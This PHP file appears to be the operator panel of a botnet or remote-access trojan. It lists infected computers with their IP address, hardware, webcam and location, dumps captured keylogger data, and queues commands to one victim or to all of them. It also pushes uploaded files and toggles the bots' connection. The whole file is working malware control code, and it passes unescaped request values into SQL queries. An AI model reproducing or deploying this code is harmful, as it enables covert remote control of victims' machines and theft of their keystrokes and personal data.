<?php
include "settings.php";

if ($_GET['pass'] == $password) {
	$command = $_REQUEST['command'];
	$id = $_GET['id'];
	$type = $_GET['type'];
	
	switch($type) {
		case "view": 
			mysql_query("UPDATE vircom SET retCommand='', retCommandNum=0, command=''");
			$query = mysql_query("SELECT * FROM vircom ORDER BY lastUpdate DESC");
			while ($row = mysql_fetch_array($query))
				echo $row['id'] . "{-}" . $row['compName'] . "{-}" . $row['operatingSystem']  . "{-}" . $row['ipAddress']  . "{-}" . $row['retCommand'] . "{-}" . $row['updateInterval'] . "{-}" . $row['lastUpdate'] . "{-}" . $row['ramMemory'] . "{-}" . $row['processor'] . "{-}" . $row['webcam'] . "{-}" . $row['location'] . "{-next}";
		break;
		
		case "klview": 
			$query = mysql_query("SELECT * FROM klcom ORDER BY dateTime DESC");
			while ($row = mysql_fetch_array($query)) 
				echo $row['kldata'];
		break;
		
		case "delete": 
			if (isset($id)) mysql_query("DELETE FROM vircom WHERE id='$id'");
			else mysql_query("DELETE FROM vircom");
		break;
		
		case "command":
			mysql_query("UPDATE vircom SET command='$command' WHERE id='$id'");
		break;
		
		case "globalcommand":
			mysql_query("UPDATE vircom SET command='$command'");
		break;
		
		case "response":
			$query = mysql_query("SELECT * FROM vircom WHERE id='$id'");
			$row = mysql_fetch_array($query);
			echo $row['retCommandNum'] . "{-}" . $row['retCommand'] . "{-}" . $row['lastUpdate'] . "{-}" . $row['updateInterval'];
		break;
		
		case "connect":
			file_put_contents('connected.php', '<?php $connected = true; ?>');
			echo "SBs connected";
		break;
		
		case "disconnect":
			file_put_contents('connected.php', '<?php $connected = false; ?>');
			echo "SBs disconnected";
		break;
		
		case "upload":
				$fullfilename = "uploads/" . $_GET['filename'];
				if (file_exists($fullfilename)) unlink ($fullfilename);
				move_uploaded_file($_FILES['file']['tmp_name'], $fullfilename);
				
				$retCommandNum = $row['retCommandNum'] + 1;
				mysql_query("UPDATE vircom SET command='', retCommand = 'RSdupload{-s}$fullfilename', retCommandNum = '$retCommandNum' WHERE id='$id'");
		break;
			
	}
}
?>